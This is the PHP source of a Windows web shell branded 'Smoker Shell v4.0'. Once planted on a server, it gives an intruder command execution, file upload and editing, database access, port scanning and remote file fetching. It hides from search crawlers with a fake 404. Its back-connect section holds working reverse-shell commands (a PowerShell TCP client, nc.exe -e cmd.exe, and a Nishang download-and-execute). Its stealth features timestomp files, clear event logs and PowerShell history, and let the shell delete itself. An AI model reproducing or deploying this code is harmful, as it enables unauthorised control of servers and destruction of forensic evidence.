<?php
/*
 * Smoker Shell v4.0 — Windows Edition
 * Advanced Penetration Testing Interface
 */
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('log_errors', 0);
@clearstatcache();

// ======================== CONFIGURATION ========================
$CONF = [
    'passwd' => 'admin',
    'title'  => 'Smoker Shell v4.0 [WIN]',
];

// ======================== CORE UTILITIES ========================

function fmt_bytes($b, $p = 2) {
    $u = ['B','KB','MB','GB','TB'];
    $b = max($b, 0);
    $pow = floor(($b ? log($b) : 0) / log(1024));
    $pow = min($pow, count($u) - 1);
    return round($b / pow(1024, $pow), $p) . ' ' . $u[$pow];
}

function fmt_perms($file) {
    $p = @fileperms($file);
    if ($p === false) return '----';
    $info = '';
    if (($p & 0xC000) == 0xC000) $info = 's';
    elseif (($p & 0xA000) == 0xA000) $info = 'l';
    elseif (($p & 0x8000) == 0x8000) $info = '-';
    elseif (($p & 0x6000) == 0x6000) $info = 'b';
    elseif (($p & 0x4000) == 0x4000) $info = 'd';
    elseif (($p & 0x2000) == 0x2000) $info = 'c';
    elseif (($p & 0x1000) == 0x1000) $info = 'p';
    else $info = '?';
    $info .= (($p & 0x0100) ? 'r' : '-');
    $info .= (($p & 0x0080) ? 'w' : '-');
    $info .= (($p & 0x0040) ? 'x' : '-');
    $info .= (($p & 0x0020) ? 'r' : '-');
    $info .= (($p & 0x0010) ? 'w' : '-');
    $info .= (($p & 0x0008) ? 'x' : '-');
    $info .= (($p & 0x0004) ? 'r' : '-');
    $info .= (($p & 0x0002) ? 'w' : '-');
    $info .= (($p & 0x0001) ? 'x' : '-');
    return $info;
}

function fmt_octal($file) {
    return substr(sprintf('%o', @fileperms($file)), -4);
}

function run_cmd($cmd) {
    $out = '';
    if (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $arr);
        $out = implode("\n", $arr);
    } elseif (function_exists('shell_exec')) {
        $out = @shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('popen')) {
        $h = @popen($cmd . ' 2>&1', 'r');
        if ($h) { while (!feof($h)) $out .= fread($h, 4096); pclose($h); }
    } elseif (function_exists('proc_open')) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($proc);
        }
    }
    return $out;
}

function get_cwd() {
    if (isset($_GET['d']) && is_dir($_GET['d'])) return realpath($_GET['d']);
    return str_replace('\\', '/', getcwd());
}

function build_breadcrumbs($path) {
    $path = str_replace('\\', '/', $path);
    if (preg_match('#^([A-Za-z]:)(/?.*)#', $path, $m)) {
        $drive = $m[1];
        $rest = trim($m[2], '/');
        $html = '<a href="?p=files&d=' . urlencode($drive . '/') . '">' . $drive . '/</a>';
        if ($rest !== '') {
            $parts = explode('/', $rest);
            $trail = $drive;
            foreach ($parts as $part) {
                $trail .= '/' . $part;
                $html .= ' <a href="?p=files&d=' . urlencode($trail) . '">' . htmlspecialchars($part) . '</a> /';
            }
        }
        return $html;
    }
    $parts = explode('/', trim($path, '/'));
    $html = '<a href="?p=files&d=/">/</a>';
    $trail = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $trail .= '/' . $part;
        $html .= ' <a href="?p=files&d=' . urlencode($trail) . '">' . htmlspecialchars($part) . '</a> /';
    }
    return $html;
}

function get_exec_methods() {
    $methods = ['exec','shell_exec','system','passthru','popen','proc_open'];
    $available = [];
    foreach ($methods as $m) {
        if (function_exists($m)) $available[] = $m;
    }
    return $available;
}

// ======================== SESSION & AUTH ========================
session_start();

$bots = '/Google|WhatsApp|Telegram|bing|Bing|yahoo|Yahoo|MSNBot|Slurp|PycURL|facebook|ia_archiver|crawler|Yandex|Bot|Spider/i';
if (preg_match($bots, $_SERVER['HTTP_USER_AGENT'] ?? '')) {
    header('HTTP/1.0 404 Not Found');
    die('<h1>Not Found</h1>');
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

if (isset($_POST['login_pass'])) {
    if ($_POST['login_pass'] === $CONF['passwd']) {
        $_SESSION['authed'] = true;
        header('Location: ?');
        exit;
    }
    $login_error = true;
}

if (empty($_SESSION['authed'])) {
    ?><!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= $CONF['title'] ?></title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0c0a10;color:#c0c8d8;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;
background-image:radial-gradient(ellipse at 20% 50%,rgba(255,0,51,.06) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(167,139,250,.04) 0%,transparent 50%)}
.login-box{background:#141018;border:1px solid #251c2e;border-radius:12px;padding:48px 40px;width:380px;text-align:center;box-shadow:0 0 60px rgba(255,0,51,.08)}
.login-box h1{color:#ff0033;font-size:22px;margin-bottom:6px;letter-spacing:2px}
.login-box .sub{color:#64748b;font-size:12px;margin-bottom:32px}
.login-box input[type=password]{width:100%;background:#0c0a10;border:1px solid #251c2e;color:#e2e8f0;padding:12px 16px;border-radius:8px;font-family:inherit;font-size:14px;margin-bottom:16px;outline:none;transition:border .2s}
.login-box input[type=password]:focus{border-color:#ff0033;box-shadow:0 0 12px rgba(255,0,51,.15)}
.login-box button{width:100%;background:#ff0033;color:#0c0a10;border:none;padding:12px;border-radius:8px;font-family:inherit;font-size:14px;font-weight:bold;cursor:pointer;transition:all .2s}
.login-box button:hover{background:#cc0029;box-shadow:0 0 20px rgba(255,0,51,.3)}
.err{color:#ef4444;font-size:12px;margin-bottom:12px}
</style></head><body>
<div class="login-box">
<h1>⬡ SMOKER SHELL</h1>
<div class="sub">v4.0 [WIN] — Advanced Penetration Testing Interface</div>
<?php if (!empty($login_error)) echo '<div class="err">Invalid credentials</div>'; ?>
<form method="post">
<input type="password" name="login_pass" placeholder="Enter password" autofocus>
<button type="submit">AUTHENTICATE</button>
</form>
<div style="margin-top:28px;color:#64748b;font-size:11px;line-height:1.6;border-top:1px solid #251c2e;padding-top:16px"><span style="color:#ff0033">Legendary Hacker</span> was here, if you are here, You already know who i am!</div>
</div></body></html><?php
    die();
}

// ======================== AUTHENTICATED ZONE ========================
$page = $_GET['p'] ?? 'dashboard';
$dir  = get_cwd();
$msg  = '';
$msg_type = '';

// ---- HANDLE POST ACTIONS ----
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Terminal command
    if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
        $_SESSION['cmd_history'] = $_SESSION['cmd_history'] ?? [];
        array_unshift($_SESSION['cmd_history'], $_POST['cmd']);
        $_SESSION['cmd_history'] = array_slice($_SESSION['cmd_history'], 0, 50);
        $win_dir = str_replace('/', '\\', $dir);
        $_SESSION['cmd_output'] = run_cmd('cd /d ' . escapeshellarg($win_dir) . ' && ' . $_POST['cmd']);
    }

    // File upload
    if (isset($_FILES['upload']) && $_FILES['upload']['error'] === 0) {
        $dest = $dir . '/' . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            $msg = 'Uploaded: ' . basename($dest); $msg_type = 'ok';
        } else { $msg = 'Upload failed'; $msg_type = 'err'; }
    }

    // Edit file save
    if (isset($_POST['edit_content']) && isset($_POST['edit_path'])) {
        if (@file_put_contents($_POST['edit_path'], $_POST['edit_content']) !== false) {
            $msg = 'File saved'; $msg_type = 'ok';
        } else { $msg = 'Save failed'; $msg_type = 'err'; }
    }

    // Create file or directory
    if (isset($_POST['create_name']) && $_POST['create_name'] !== '') {
        $target = $dir . '/' . $_POST['create_name'];
        if ($_POST['create_type'] === 'dir') {
            if (@mkdir($target, 0755)) { $msg = 'Directory created'; $msg_type = 'ok'; }
            else { $msg = 'Failed to create directory'; $msg_type = 'err'; }
        } else {
            if (@file_put_contents($target, '') !== false) { $msg = 'File created'; $msg_type = 'ok'; }
            else { $msg = 'Failed to create file'; $msg_type = 'err'; }
        }
    }

    // Rename
    if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
        if (@rename($_POST['rename_from'], $_POST['rename_to'])) {
            $msg = 'Renamed successfully'; $msg_type = 'ok';
        } else { $msg = 'Rename failed'; $msg_type = 'err'; }
    }

    // Database query
    if (isset($_POST['db_query']) && isset($_POST['db_type'])) {
        $_SESSION['db_result'] = null;
        $_SESSION['db_error'] = null;
        $_SESSION['db_query_text'] = $_POST['db_query'];

        if ($_POST['db_type'] === 'mysql' && function_exists('mysqli_connect')) {
            $conn = @mysqli_connect($_POST['db_host'] ?? 'localhost', $_POST['db_user'] ?? 'root', $_POST['db_pass'] ?? '', $_POST['db_name'] ?? '', (int)($_POST['db_port'] ?? 3306));
            if ($conn) {
                $res = @mysqli_query($conn, $_POST['db_query']);
                if ($res === true) {
                    $_SESSION['db_result'] = [['Affected Rows' => mysqli_affected_rows($conn)]];
                } elseif ($res) {
                    $rows = [];
                    while ($row = mysqli_fetch_assoc($res)) $rows[] = $row;
                    $_SESSION['db_result'] = $rows;
                } else {
                    $_SESSION['db_error'] = mysqli_error($conn);
                }
                mysqli_close($conn);
            } else {
                $_SESSION['db_error'] = 'Connection failed: ' . mysqli_connect_error();
            }
        } elseif ($_POST['db_type'] === 'sqlite' && class_exists('SQLite3')) {
            try {
                $db = new SQLite3($_POST['db_file']);
                $res = $db->query($_POST['db_query']);
                $rows = [];
                if ($res) { while ($row = $res->fetchArray(SQLITE3_ASSOC)) $rows[] = $row; }
                $_SESSION['db_result'] = $rows;
                $db->close();
            } catch (Exception $e) {
                $_SESSION['db_error'] = $e->getMessage();
            }
        } elseif ($_POST['db_type'] === 'mssql') {
            if (function_exists('sqlsrv_connect')) {
                $conn = @sqlsrv_connect($_POST['db_host'] ?? 'localhost', ['Database' => $_POST['db_name'] ?? '', 'UID' => $_POST['db_user'] ?? 'sa', 'PWD' => $_POST['db_pass'] ?? '']);
                if ($conn) {
                    $res = @sqlsrv_query($conn, $_POST['db_query']);
                    if ($res) {
                        $rows = [];
                        while ($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) $rows[] = $row;
                        $_SESSION['db_result'] = $rows ?: [['Result' => 'Query executed']];
                        sqlsrv_free_stmt($res);
                    } else {
                        $errs = sqlsrv_errors();
                        $_SESSION['db_error'] = $errs ? $errs[0]['message'] : 'Query failed';
                    }
                    sqlsrv_close($conn);
                } else {
                    $errs = sqlsrv_errors();
                    $_SESSION['db_error'] = 'Connection failed: ' . ($errs ? $errs[0]['message'] : 'Unknown error');
                }
            } else {
                $_SESSION['db_error'] = 'sqlsrv extension not loaded';
            }
        }
    }

    // Port scan
    if (isset($_POST['scan_host']) && isset($_POST['scan_ports'])) {
        $host = $_POST['scan_host'];
        $ports_raw = $_POST['scan_ports'];
        $timeout = (float)($_POST['scan_timeout'] ?? 1);
        $results = [];
        $port_list = [];

        if (strpos($ports_raw, '-') !== false) {
            list($start, $end) = explode('-', $ports_raw, 2);
            $port_list = range((int)$start, min((int)$end, (int)$start + 1024));
        } else {
            $port_list = array_map('intval', explode(',', $ports_raw));
        }

        foreach ($port_list as $port) {
            $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
            if ($fp) { $results[$port] = 'open'; fclose($fp); }
            else { $results[$port] = 'closed'; }
        }
        $_SESSION['scan_results'] = $results;
        $_SESSION['scan_host'] = $host;
    }

    // Fetch URL
    if (isset($_POST['fetch_url']) && $_POST['fetch_url'] !== '') {
        $url = $_POST['fetch_url'];
        $save_as = $_POST['fetch_saveas'] ?? basename(parse_url($url, PHP_URL_PATH));
        if (!$save_as) $save_as = 'downloaded_file';
        $dest = $dir . '/' . $save_as;
        $content = @file_get_contents($url);
        if ($content !== false && @file_put_contents($dest, $content) !== false) {
            $msg = 'Downloaded to: ' . $dest; $msg_type = 'ok';
        } else { $msg = 'Download failed'; $msg_type = 'err'; }
    }

    // Back connect
    if (isset($_POST['bc_ip']) && isset($_POST['bc_port']) && isset($_POST['bc_method'])) {
        $ip = $_POST['bc_ip'];
        $port = (int)$_POST['bc_port'];
        $method = $_POST['bc_method'];
        if ($method === 'php') {
            $sock = @fsockopen($ip, $port, $errno, $errstr, 10);
            if ($sock) {
                $desc = [0 => $sock, 1 => $sock, 2 => $sock];
                $proc = @proc_open('cmd.exe', $desc, $pipes);
                if (is_resource($proc)) { $msg = 'Reverse shell spawned'; $msg_type = 'ok'; }
                else { $msg = 'proc_open failed'; $msg_type = 'err'; }
            } else { $msg = "Connect failed: $errstr ($errno)"; $msg_type = 'err'; }
        } else {
            $cmds = [
                'powershell' => "powershell -nop -ep bypass -c \"\$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()\"",
                'nc'         => "nc.exe -e cmd.exe $ip $port",
                'nishang'    => "powershell -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://$ip:$port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port $port\"",
            ];
            if (isset($cmds[$method])) {
                run_cmd('start /b ' . $cmds[$method]);
                $msg = 'Reverse shell command executed'; $msg_type = 'ok';
            }
        }
    }

    // Timestomp
    if (isset($_POST['ts_file']) && isset($_POST['ts_time'])) {
        $ts = strtotime($_POST['ts_time']);
        if ($ts && @touch($_POST['ts_file'], $ts, $ts)) {
            $msg = 'Timestamps modified'; $msg_type = 'ok';
        } else { $msg = 'Timestomp failed'; $msg_type = 'err'; }
    }

    // Self destruct
    if (isset($_POST['self_destruct']) && $_POST['self_destruct'] === 'CONFIRM') {
        @unlink(__FILE__);
        session_destroy();
        die('<html><body style="background:#0c0a10;color:#ef4444;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>Shell destroyed.</h1></body></html>');
    }

    // Clear event logs
    if (isset($_POST['clear_log'])) {
        $log = $_POST['clear_log'];
        if (strpos($log, '\\') !== false || strpos($log, '/') !== false) {
            if (is_writable($log)) {
                @file_put_contents($log, '');
                $msg = 'Log file cleared: ' . $log; $msg_type = 'ok';
            } else { $msg = 'Not writable: ' . $log; $msg_type = 'err'; }
        } else {
            $result = run_cmd('wevtutil cl ' . escapeshellarg($log));
            $msg = 'Event log clear attempted: ' . $log; $msg_type = 'ok';
        }
    }

    // Clear PowerShell history
    if (isset($_POST['clear_history'])) {
        $profile = getenv('USERPROFILE') ?: run_cmd('echo %USERPROFILE%');
        $profile = trim($profile);
        $targets = [
            $profile . '\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
            $profile . '\\.bash_history',
        ];
        $cleared = [];
        foreach ($targets as $t) {
            if (file_exists($t)) {
                @file_put_contents($t, '');
                $cleared[] = basename($t);
            }
        }
        run_cmd('doskey /reinstall');
        $msg = 'Cleared: ' . ($cleared ? implode(', ', $cleared) : 'no history files found') . ' + doskey buffer'; $msg_type = 'ok';
    }
}

// ---- HANDLE GET ACTIONS ----
if (isset($_GET['dl']) && is_file($_GET['dl'])) {
    $file = $_GET['dl'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

if (isset($_GET['delete']) && isset($_GET['file'])) {
    if ($_GET['delete'] === 'file' && @unlink($_GET['file'])) {
        $msg = 'File deleted'; $msg_type = 'ok';
    } elseif ($_GET['delete'] === 'dir' && @rmdir($_GET['file'])) {
        $msg = 'Directory removed'; $msg_type = 'ok';
    } else { $msg = 'Delete failed'; $msg_type = 'err'; }
}

// ======================== GATHER PAGE DATA ========================
$sys_info = [
    'os'       => php_uname(),
    'hostname' => php_uname('n'),
    'kernel'   => php_uname('r'),
    'arch'     => php_uname('m'),
    'php'      => phpversion(),
    'sapi'     => php_sapi_name(),
    'user'     => get_current_user(),
    'cwd'      => $dir,
    'server'   => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'docroot'  => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
    'disk_free'  => function_exists('disk_free_space') ? fmt_bytes(@disk_free_space($dir)) : 'N/A',
    'disk_total' => function_exists('disk_total_space') ? fmt_bytes(@disk_total_space($dir)) : 'N/A',
    'disabled'   => ini_get('disable_functions') ?: 'None',
    'open_basedir' => ini_get('open_basedir') ?: 'None',
    'exec_methods' => get_exec_methods(),
];
$whoami = trim(run_cmd('whoami'));

$nav_items = [
    'dashboard' => ['icon' => '◈', 'label' => 'Dashboard'],
    'files'     => ['icon' => '▤', 'label' => 'File Manager'],
    'terminal'  => ['icon' => '⬡', 'label' => 'Terminal'],
    'recon'     => ['icon' => '◎', 'label' => 'System Recon'],
    'network'   => ['icon' => '⬢', 'label' => 'Network Tools'],
    'database'  => ['icon' => '⊞', 'label' => 'Database'],
    'privesc'   => ['icon' => '⬆', 'label' => 'Priv-Esc'],
    'encoding'  => ['icon' => '⟐', 'label' => 'Encoding'],
    'stealth'   => ['icon' => '⊘', 'label' => 'Stealth'],
];

// ======================== HTML OUTPUT ========================
?><!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= $CONF['title'] ?> — <?= $nav_items[$page]['label'] ?? 'Shell' ?></title>
<style>
:root{
    --bg:#0c0a10;--bg2:#141018;--bg3:#1c1525;--border:#251c2e;
    --accent:#ff0033;--cyan:#a78bfa;--red:#ef4444;--yellow:#f59e0b;--blue:#3b82f6;
    --text:#c0c8d8;--text2:#64748b;--text3:#94a3b8;
}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:'Courier New','Fira Code',monospace;font-size:13px;display:flex;min-height:100vh;
background-image:radial-gradient(ellipse at 10% 90%,rgba(255,0,51,.05) 0%,transparent 50%),radial-gradient(ellipse at 90% 10%,rgba(167,139,250,.04) 0%,transparent 50%)}
a{color:#c084fc;text-decoration:none}
a:hover{color:var(--accent)}

.sidebar{width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;position:fixed;height:100vh;z-index:10}
.sidebar .brand{padding:20px 16px;border-bottom:1px solid var(--border);text-align:center}
.sidebar .brand h2{color:var(--accent);font-size:14px;letter-spacing:3px}
.sidebar .brand .ver{color:var(--text2);font-size:10px;margin-top:4px}
.sidebar nav{flex:1;overflow-y:auto;padding:8px 0}
.sidebar nav a{display:flex;align-items:center;gap:10px;padding:10px 20px;color:var(--text3);transition:all .15s;border-left:3px solid transparent;font-size:12px}
.sidebar nav a:hover{background:rgba(255,0,51,.05);color:var(--accent);border-left-color:var(--accent)}
.sidebar nav a.active{background:rgba(255,0,51,.08);color:var(--accent);border-left-color:var(--accent)}
.sidebar nav a .icon{font-size:16px;width:20px;text-align:center}
.sidebar .sidebar-footer{padding:12px 16px;border-top:1px solid var(--border);font-size:10px;color:var(--text2)}
.sidebar .sidebar-footer a{color:var(--red);font-size:10px}

.main{margin-left:220px;flex:1;min-height:100vh;display:flex;flex-direction:column}
.topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 24px;display:flex;align-items:center;gap:16px;font-size:11px;color:var(--text2);flex-wrap:wrap}
.topbar .tag{background:var(--bg);border:1px solid var(--border);padding:2px 8px;border-radius:4px;color:var(--text3)}
.topbar .tag b{color:var(--accent)}
.content{flex:1;padding:24px}

.grid{display:grid;gap:16px}
.grid-2{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}
.grid-3{grid-template-columns:repeat(auto-fit,minmax(250px,1fr))}
.grid-4{grid-template-columns:repeat(auto-fit,minmax(200px,1fr))}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:20px}
.card .val{font-size:20px;color:#fff;font-weight:bold}
.card .label{font-size:11px;color:var(--text2);margin-top:4px}
.panel{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:16px}
.panel-head{padding:14px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.panel-head h3{color:var(--accent);font-size:12px;letter-spacing:1px;text-transform:uppercase}
.panel-body{padding:20px}

table.tbl{width:100%;border-collapse:collapse;font-size:12px}
table.tbl th{background:var(--bg);color:var(--accent);padding:8px 12px;text-align:left;font-size:11px;letter-spacing:.5px;text-transform:uppercase;border-bottom:1px solid var(--border)}
table.tbl td{padding:8px 12px;border-bottom:1px solid rgba(37,28,46,.5);color:var(--text)}
table.tbl tr:hover td{background:rgba(255,0,51,.03)}
table.tbl .open{color:var(--accent)}
table.tbl .closed{color:var(--text2)}

input[type=text],input[type=password],input[type=number],select,textarea{
    background:var(--bg);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:6px;font-family:inherit;font-size:12px;outline:none;transition:border .2s}
input:focus,textarea:focus,select:focus{border-color:var(--accent);box-shadow:0 0 8px rgba(255,0,51,.15)}
textarea{width:100%;resize:vertical;min-height:120px}
.btn{display:inline-block;padding:8px 16px;border:1px solid var(--border);background:var(--bg);color:var(--text);border-radius:6px;cursor:pointer;font-family:inherit;font-size:12px;transition:all .15s}
.btn:hover{border-color:var(--accent);color:var(--accent);box-shadow:0 0 10px rgba(255,0,51,.1)}
.btn-green{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:bold}
.btn-green:hover{background:#cc0029;box-shadow:0 0 16px rgba(255,0,51,.3)}
.btn-red{border-color:var(--red);color:var(--red)}
.btn-red:hover{background:var(--red);color:#fff;box-shadow:0 0 12px rgba(239,68,68,.3)}
.btn-sm{padding:4px 10px;font-size:11px}
.form-row{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
.form-row label{min-width:80px;color:var(--text2);font-size:11px}

.terminal{background:#000;border:1px solid var(--border);border-radius:8px;font-family:'Courier New',monospace;overflow:hidden}
.terminal-head{background:var(--bg2);padding:8px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px}
.terminal-head .dot{width:10px;height:10px;border-radius:50%}
.terminal-body{padding:16px;max-height:500px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;font-size:12px;color:#ff3355;line-height:1.6}
.terminal-input{display:flex;border-top:1px solid var(--border);background:#0a0a0a}
.terminal-input span{padding:10px 0 10px 14px;color:var(--accent);font-weight:bold;white-space:nowrap}
.terminal-input input{flex:1;background:transparent;border:none;color:var(--text);padding:10px;font-family:inherit;font-size:13px;outline:none}

.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:16px}
.tab{padding:10px 20px;color:var(--text2);cursor:pointer;border-bottom:2px solid transparent;font-size:12px;transition:all .15s}
.tab:hover{color:var(--text)}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-content{display:none}
.tab-content.active{display:block}

.msg{padding:10px 16px;border-radius:6px;margin-bottom:16px;font-size:12px}
.msg-ok{background:rgba(255,0,51,.1);border:1px solid rgba(255,0,51,.2);color:var(--accent)}
.msg-err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:var(--red)}

.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:bold}
.badge-green{background:rgba(255,0,51,.15);color:#ff3355}
.badge-red{background:rgba(239,68,68,.15);color:var(--red)}
.badge-yellow{background:rgba(245,158,11,.15);color:var(--yellow)}
.badge-blue{background:rgba(59,130,246,.15);color:var(--blue)}
.badge-cyan{background:rgba(167,139,250,.15);color:var(--cyan)}

.hex-view{font-family:'Courier New',monospace;font-size:11px;line-height:1.8;background:#000;padding:16px;border-radius:6px;overflow-x:auto;color:var(--text2)}
.hex-view .offset{color:#a78bfa}
.hex-view .byte{color:var(--text)}
.hex-view .ascii{color:#ff3355}

::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:#3a2545}

@media(max-width:768px){.sidebar{width:60px}.sidebar .brand h2,.sidebar nav a span,.sidebar .sidebar-footer{display:none}.sidebar nav a{justify-content:center;padding:14px}.main{margin-left:60px}}
</style>
</head><body>

<div class="sidebar">
    <div class="brand">
        <h2>◈ SMOKER</h2>
        <div class="ver">SHELL v4.0 [WIN]</div>
    </div>
    <nav>
        <?php foreach ($nav_items as $key => $item): ?>
        <a href="?p=<?= $key ?><?= $key === 'files' ? '&d=' . urlencode($dir) : '' ?>" class="<?= $page === $key ? 'active' : '' ?>">
            <span class="icon"><?= $item['icon'] ?></span>
            <span><?= $item['label'] ?></span>
        </a>
        <?php endforeach; ?>
    </nav>
    <div class="sidebar-footer">
        <?= htmlspecialchars($whoami) ?><br>
        <a href="?logout=true">[ Logout ]</a>
    </div>
</div>

<div class="main">
<div class="topbar">
    <span class="tag"><b>OS</b> <?= php_uname('s') ?> <?= php_uname('r') ?></span>
    <span class="tag"><b>PHP</b> <?= $sys_info['php'] ?></span>
    <span class="tag"><b>User</b> <?= htmlspecialchars($whoami) ?></span>
    <span class="tag"><b>Disk</b> <?= $sys_info['disk_free'] ?> free</span>
    <span class="tag"><b>Exec</b> <?= count($sys_info['exec_methods']) ?> methods</span>
</div>

<div class="content">

<?php if ($msg): ?>
<div class="msg msg-<?= $msg_type ?>"><?= htmlspecialchars($msg) ?></div>
<?php endif; ?>

<?php
// ============================================================
//  DASHBOARD
// ============================================================
if ($page === 'dashboard'): ?>

<div class="grid grid-4" style="margin-bottom:20px">
    <div class="card"><div class="val"><?= php_uname('s') ?></div><div class="label">Operating System</div></div>
    <div class="card"><div class="val"><?= $sys_info['php'] ?></div><div class="label">PHP Version</div></div>
    <div class="card"><div class="val"><?= $sys_info['disk_free'] ?></div><div class="label">Free Disk Space</div></div>
    <div class="card"><div class="val"><?= count($sys_info['exec_methods']) ?></div><div class="label">Exec Methods</div></div>
</div>

<div class="grid grid-2">
    <div class="panel">
        <div class="panel-head"><h3>Server Info</h3></div>
        <div class="panel-body">
            <table class="tbl">
                <tr><td style="color:var(--text2);width:140px">Hostname</td><td><?= htmlspecialchars($sys_info['hostname']) ?></td></tr>
                <tr><td style="color:var(--text2)">OS Version</td><td><?= htmlspecialchars(php_uname('r') . ' ' . php_uname('v')) ?></td></tr>
                <tr><td style="color:var(--text2)">Architecture</td><td><?= htmlspecialchars($sys_info['arch']) ?></td></tr>
                <tr><td style="color:var(--text2)">Server Software</td><td><?= htmlspecialchars($sys_info['server']) ?></td></tr>
                <tr><td style="color:var(--text2)">Document Root</td><td><?= htmlspecialchars($sys_info['docroot']) ?></td></tr>
                <tr><td style="color:var(--text2)">Current Directory</td><td style="word-break:break-all"><?= htmlspecialchars($sys_info['cwd']) ?></td></tr>
                <tr><td style="color:var(--text2)">Running As</td><td><?= htmlspecialchars($whoami) ?></td></tr>
                <tr><td style="color:var(--text2)">SAPI</td><td><?= $sys_info['sapi'] ?></td></tr>
                <tr><td style="color:var(--text2)">Disk</td><td><?= $sys_info['disk_free'] ?> free / <?= $sys_info['disk_total'] ?> total</td></tr>
            </table>
        </div>
    </div>
    <div class="panel">
        <div class="panel-head"><h3>PHP Configuration</h3></div>
        <div class="panel-body">
            <table class="tbl">
                <tr><td style="color:var(--text2);width:140px">Open Basedir</td><td><span class="badge <?= $sys_info['open_basedir'] === 'None' ? 'badge-green' : 'badge-yellow' ?>"><?= htmlspecialchars($sys_info['open_basedir']) ?></span></td></tr>
                <tr><td style="color:var(--text2)">Exec Methods</td><td><?php foreach($sys_info['exec_methods'] as $m) echo '<span class="badge badge-green" style="margin:2px">'.$m.'</span> '; if(!$sys_info['exec_methods']) echo '<span class="badge badge-red">None</span>'; ?></td></tr>
                <tr><td style="color:var(--text2)">Disabled Functions</td><td style="word-break:break-all;font-size:10px;max-width:300px"><?= htmlspecialchars($sys_info['disabled'] === 'None' ? 'None' : substr($sys_info['disabled'], 0, 500)) ?></td></tr>
                <tr><td style="color:var(--text2)">Max Execution</td><td><?= ini_get('max_execution_time') ?>s</td></tr>
                <tr><td style="color:var(--text2)">Memory Limit</td><td><?= ini_get('memory_limit') ?></td></tr>
                <tr><td style="color:var(--text2)">Upload Max</td><td><?= ini_get('upload_max_filesize') ?></td></tr>
                <tr><td style="color:var(--text2)">POST Max</td><td><?= ini_get('post_max_size') ?></td></tr>
                <tr><td style="color:var(--text2)">Extensions</td><td><?= count(get_loaded_extensions()) ?> loaded</td></tr>
            </table>
        </div>
    </div>
</div>

<?php
// ============================================================
//  FILE MANAGER
// ============================================================
elseif ($page === 'files'):
    $editing = isset($_GET['edit']) && is_file($_GET['edit']);
    $hexview = isset($_GET['hex']) && is_file($_GET['hex']);
    $viewing = isset($_GET['view']) && is_file($_GET['view']);
?>

<div class="panel">
    <div class="panel-head">
        <h3>📁 <?= build_breadcrumbs($dir) ?></h3>
        <div style="display:flex;gap:6px">
            <form method="post" enctype="multipart/form-data" style="display:flex;gap:6px;align-items:center">
                <input type="file" name="upload" style="font-size:11px;max-width:200px">
                <button class="btn btn-sm" type="submit">Upload</button>
            </form>
        </div>
    </div>
    <div class="panel-body">

